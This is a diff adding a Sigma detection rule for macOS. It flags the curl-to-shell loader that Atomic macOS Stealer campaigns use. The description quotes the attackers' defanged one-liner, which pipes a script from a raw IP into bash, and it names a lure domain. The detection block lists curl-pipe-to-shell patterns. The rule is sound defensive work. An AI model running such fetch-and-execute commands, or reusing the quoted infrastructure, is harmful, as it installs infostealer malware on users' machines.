@@ -1,0 +1,57 @@
+title: AMOS macOS Stealer curl-to-Shell First-Stage Loader
+id: 46ebb27a-1b54-4f1a-a9d1-ade8c4fe428d
+status: experimental
+description: |
+  Detects the curl-to-shell first-stage loader used by AMOS / Atomic macOS
+  Stealer delivery campaigns, including the malicious OpenClaw skill chain
+  documented by Trend Micro (research 26/b, Feb 2026). The fake "prerequisite
+  driver" fetched from openclawcli.vercel.app runs a one-liner of the shape
+  /bin/bash -c "$(curl -fsSL hxxp://91.92.242.30/<16char>)", piping a remote
+  script directly into a shell. The same pattern appears across AMOS, MacSync
+  and Shub ClickFix chains reported by Microsoft on 2026-05-06. This rule fires
+  on a Unix shell invoked with -c whose command line also contains a curl
+  download, which is the highest-fidelity process anchor in the chain. Pair
+  with the osascript fake-password rule and the curl multipart exfil rule.
+references:
+  - https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html
+  - https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
+  - https://www.glueckkanja.com/en/posts/2026-04-10-incident-to-intelligence
+author: Jarmi
+date: 2026/05/30
+tags:
+  - attack.execution
+  - attack.command-and-control
+  - attack.t1059.004
+  - attack.t1105
+logsource:
+  category: process_creation
+  product: macos
+detection:
+  selection_shell:
+    Image|endswith:
+      - '/bash'
+      - '/sh'
+      - '/zsh'
+    CommandLine|contains: '-c'
+  selection_curl:
+    CommandLine|contains|all:
+      - 'curl'
+      - 'http'
+  selection_fetch_flags:
+    CommandLine|contains:
+      - '-fsSL'
+      - '-fsL'
+      - '-sSL'
+      - '$(curl'
+      - '| bash'
+      - '|bash'
+      - '| sh'
+      - '| zsh'
+  condition: selection_shell and selection_curl and selection_fetch_flags
+falsepositives:
+  - Legitimate developer bootstrap installers (Homebrew, rustup, nvm) that use
+    a curl-to-shell pattern; baseline by parent process and destination host
+    and exclude known-good install domains
+  - CI/CD provisioning scripts on developer or build Macs
+
+level: high
